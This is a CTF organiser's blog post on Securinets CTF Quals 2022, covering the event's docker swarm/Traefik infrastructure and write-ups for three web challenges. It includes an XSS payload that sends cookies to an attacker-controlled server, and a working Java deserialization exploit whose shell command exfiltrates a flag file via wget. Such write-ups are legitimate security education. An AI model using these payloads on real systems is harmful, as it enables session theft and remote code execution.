---
title: Securinets CTF Quals 2022 - Infrastructure and Web writeups
summary: 
date: "2022-04-14T00:00:00Z"

reading_time: true  # Show estimated reading time?
share: true  # Show social sharing links?
profile: true  # Show author profile?
comments: true  # Show comments?
# Optional header image (relative to `static/img/` folder).
header:
  caption: ""
  image: ""
---

The last weekend we organised Securinets CTF Quals 2022, which is the most prestigious CTF in Tunisia and one of the most internationally known CTFs, this year we will reach around 70 weight after the positive feedbacks which is a huge achievement.

![CTFTIME](https://i.imgur.com/NYhqlD8.png)

As Securinets Technical director I was in charge of managing the CTF, I took care of the Infrastructure and wrote 3 web challenges. In this article we will talk about some infrastructure details and the solutions of my web challenges.
1-Infrastructure
2-Planet sheet Writeup (XSS with CSP Bypass)
3-BrokenParrot Writeup (Custom Java Deserialization Gadget)
4-NarutoKeeper Writeup (XSLeak Challenge)

## Infrastructure

We knew that a huge number will participate so we tried to anticipate in order to have a stable infrastructure. We opted for the following architecture:


A separated instance for the Database and an instance for the platform. I used docker swarm ( 4 containers ) and Traefik as a load balancer to ensure a certain level of scalability. This was the final docker-compose:

```yaml
version: '3.8'

services:
  ctfd:
    image: 127.0.0.1:2000/qualsplat
    build: .
    user: root
    restart: always
    ports:
      - "8000:8000"
    environment:
      - DATABASE_URL=mysql+pymysql://ctfd:REDACTED@IP/ctfd
      - SECRET_KEY=REDACTED
      - REDIS_URL=redis://cache:6379
      - WORKERS=6
      - LOG_FOLDER=/var/log/CTFd
      - SQLALCHEMY_MAX_OVERFLOW=800
      - SQLALCHEMY_POOL_PRE_PING=True
      - ACCESS_LOG=-
      - ERROR_LOG=-
      - REVERSE_PROXY=true
 #   volumes:
 #     - /logs:/var/log/CTFd
 #     - /opt/CTFd:/opt/CTFd:ro
    deploy:
      replicas: 4
      placement:
        max_replicas_per_node: 4
      labels:
        - "traefik.enable=true"
        - "traefik.http.routers.ctfd.rule=Host(`20.231.33.243`) || Host(`www.ctfsecurinets.tech`) || Host(`ctfsecurinets.tech`)"
        - "traefik.http.routers.ctfd.entrypoints=web"
        - "traefik.http.services.ctfd.loadbalancer.server.port=8000"
        - "traefik.http.services.ctfd.loadbalancer.sticky=true"
        - "traefik.http.services.ctfd.loadbalancer.sticky.cookie.name=StickyCookie"
    networks:
        net:
        internal:


  loadbalancer:
    image: traefik:v2.2
    command: 
      - "--log.level=ERROR"
      - "--api.insecure=true"
      - "--providers.docker.swarmMode=true"
      - "--providers.docker.network=quals_net"
      - "--providers.docker.exposedbydefault=false"
      - "--entrypoints.web.address=:80"
    ports:
      - 80:80
      - 9000:8080
      - 5000:5000
    network_mode: "host"
    deploy:
      restart_policy:
        condition: any
      mode: replicated
      placement:
        constraints:
          - "node.role==manager"
         max_replicas_per_node: 1
      replicas: 1
      update_config:
        delay: 2s
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
    networks:
        net:

networks:
    default:
    internal:
        internal: true
    net:

```

### Monitoring

For monitoring and alerting I inspired from @theoremoon san in Zer0ptsCTF and used [Mackerel](https://mackerel.io) . 

![DASHBOARD](https://i.imgur.com/BHHTuwV.png)

It is easy to setup and supports alerting via different channels ( including Discord ) so I installed the agent in the most critical servers of the infra which helped us a lot in handling and anticipating the different issues.

![MONITOR](https://i.imgur.com/82gqHiE.png)

In case of any alerts we receive a similar message in discord:

![ALERT](https://i.imgur.com/hiKJuMO.png)

# Web Challenges Writeup:
## Planet sheet:

I thought that this challenge will be a good warm up but some players ended up having some troubles with it. Visiting the website we can notice /show.php page that has a src parameter getting reflected directly in the page:

![REFLECTED](https://i.imgur.com/7zGxIBp.png)

We can notice that the Content-Type is **text/xsl** so usual script tags won't work here since it's not rendered as an HTML Page.

![CT](https://i.imgur.com/ikGS9Pk.png)
So we will use the following payload to execute JS code.

```
<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(document.domain)</x:script>

```

A keen eye may have already noticed the CSP. For the first time it may appear as a strict policy protected by nonces but if we refresh the page for a few times, we can see that the nonce is fixed thus we can reuse it here.

```
<x:script nonce="Y8Ret8N5CPXrSG" xmlns:x="http://www.w3.org/1999/xhtml">fetch("http://Your_Server?a="+document.cookie)</x:script>

```

## BrokenParr0t

![CARD](https://i.imgur.com/UFecnMQ.png)

I was lately interested in Java Deserialization custom gadget chains and done a lot of researchs on this subject, my first attempt was in FwordCTF 2021 where I created Parrot challenge ([Writeup](https://exti0p.github.io/ctf/2021/FwordCTF/web/parrotox.html) If you are interested) and in Securinets Quals I decided to try another idea with some new gadget types.
As always, we have given the source code to the participants. After decompiling the jar file with jd-gui, we can explore the different classes of the application. At first glance, we can notice the arbitrary java deserialization in the /latest_question endpoint but we can notice that the input is handled first by a class Security.

![SOURCE](https://i.imgur.com/HlkSnEl.png)

Digging in Security class we see that it's restricting the deserialization of only the classes in com.securinets.utils  and java.(.*) packages.

![SECURITY](https://i.imgur.com/Rab6YyP.png)

It's pretty obvious that we manually need to craft the gadget chain to achieve RCE since automated tools won't work here. We can see that com.securinets.utils.QuestionCompar is overriding compare method and deserializing the value of **internal** attribute after Base64 decoding it. The deserialized object here is also restricted by another class called LooseSecurity which let us deserialize classes from com.securinets package, so the scope to search for gadgets is bigger.

![JAVA](https://i.imgur.com/Zzk0BHQ.png)

The idea here is to PriorityQueue class in java.util with the custom comparator QuestionCompar as an entry gadget. If we dig in PriorityQueue source code in jdk, we see that when it's deserialized it calls the method heapify [L779](http://hg.openjdk.java.net/jdk8/jdk8/jdk/file/687fd7c7986d/src/share/classes/java/util/PriorityQueue.java#l779), heapify method will also call siftdown [L734](http://hg.openjdk.java.net/jdk8/jdk8/jdk/file/687fd7c7986d/src/share/classes/java/util/PriorityQueue.java#l734) that will call siftdown [L695](http://hg.openjdk.java.net/jdk8/jdk8/jdk/file/687fd7c7986d/src/share/classes/java/util/PriorityQueue.java#l685). finally since we have provided a custom comparator, siftDownUsingComparator method will call the overriden compare method in QuestionCompa comparator [L712](http://hg.openjdk.java.net/jdk8/jdk8/jdk/file/687fd7c7986d/src/share/classes/java/util/PriorityQueue.java#l712).
Now for the last piece, we can take a look at the serializable class com.securinets.services.Author that is calling compute method as follow:

![AUTHOR](https://i.imgur.com/Fr9jBpn.png)

We need to set uuid attribute to a value that has a hashcode equal to 0 (f5a5a608), and name attribute to our final payload that reads the flag.     

```java
import com.securinets.services.Author;
import com.securinets.utils.QuestionCompar;

import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.Comparator;
import java.util.PriorityQueue;

public class Exp {
    public Exp() {
    }

    public static void main(String[] var0) {
        try {
//second object
            Author auth = new Author();
            Field uuid = Author.class.getDeclaredField("uuid");
            uuid.setAccessible(true);
            uuid.set(auth, new String("f5a5a608"));
            Field name = Author.class.getDeclaredField("name");
            name.setAccessible(true);
            name.set(auth, new String("sh -c $@|sh . echo wget http://Your_Server?a=$(cat /flag.txt|base64|tr -d \"\n\")"));
            final ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            final ObjectOutputStream objectOutputStream;
            objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
            objectOutputStream.writeObject(auth);
            objectOutputStream.close();
            String secondSerial = Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());

            Constructor ctor =  QuestionCompar.class.getDeclaredConstructor();
            ctor.setAccessible(true);
            Comparator comparator=(Comparator) ctor.newInstance();
            Field var1 = QuestionCompar.class.getDeclaredField("internal");
            var1.setAccessible(true);
            var1.set(comparator, secondSerial);
            final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
            queue.add(new String("1"));
            queue.add(new String("1"));


            FileOutputStream fileOutputStream
                    = new FileOutputStream("result");
            ObjectOutputStream oos
                    = new ObjectOutputStream(fileOutputStream);
            oos.writeObject(queue);
            oos.flush();
            oos.close();

            System.out.println("Object has been serialized");
        } catch (Exception var6) {
            System.out.println("IOException is caught");
	    var6.printStackTrace();
        }
    }
}


```

In a nutshell, this exploit starts by creating a ProprityQueue object implementing QuestionCompar as a custom comparator after setting the internal attribute to the value of Author class serialized and Base64 encoded.

## NarutoKeeper
XSLeak vulnerability attracted me a lot lately so as a ritual I'm publishing a different challenge about this vulnerability in every CTF. This particular challenge was meant to be harder, but due to a little mistake it was solved with another technique, so I decided to keep the intended solution for a future CTF since it's worth the effort.
![TASK](https://i.imgur.com/is1Wwwa.png)
As every XSLeak challenge we need to leak the flag from a cross origin context. Here in the search endpoint we can notice that is the answer is correct we will be redirected to /view endpoint otherwise we will receive a no results message. So if we detect if the redirect has happened or not in cross origin, we will manage to exfiltrate the flag char by char.

![SEARCH](https://i.imgur.com/gx6QDgF.png)

In fact, fetch throws an error if we exceed 20 redirects, so the idea is to redirect the admin to our controlled website 19 times and in the 20th redirect we initiate our search request, thus if the char is correct we will be redirected to /view so we will have a network error since we exceeded the possible 20 redirect otherwise network error won't be triggered.
You can check the following **[Writeup](https://ctf.zeyu2001.com/2022/securinets-ctf-quals-2022/narutokeeper)** and exploit by zeyu2001 for example.

# Conclusion
We hope that everyone enjoyed this edition of Securinets Quals, we were very happy to reach 70 weight in CTFTime so we are now the most rated CTF in MENA Region. We can't wait to see everyone in the finals so soon!





